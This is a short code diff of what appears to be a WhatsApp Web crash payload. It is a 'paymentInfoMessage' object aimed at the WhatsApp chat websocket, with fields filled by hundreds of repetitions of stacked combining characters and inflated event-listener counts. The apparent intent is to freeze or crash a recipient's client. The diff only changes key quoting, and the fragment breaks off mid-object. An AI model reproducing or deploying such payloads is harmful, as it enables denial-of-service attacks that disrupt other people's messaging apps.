@@ -4,13 +4,13 @@
   "resultado": {
     "type": "paymentInfoMessage",
     "ws": {
-      _events: {
+      "_events": {
         "CB:ib,,dirty": [
           "𝄽̸̷̷̸̛̽͢͟͠͞͡͏́͢͟͡".repeat(500)
         ]
       },
-      _eventsCount: 999999999,
-      _maxListeners: Infinity,
+      "_eventsCount": 999999999,
+      "_maxListeners": Infinity,
       "url": "wss://web.whatsapp.com/ws/chat",
       "config": {
         "currencyCode": "𝄽̸̷̷̛̽͢͟͠͞͡".repeat(400),
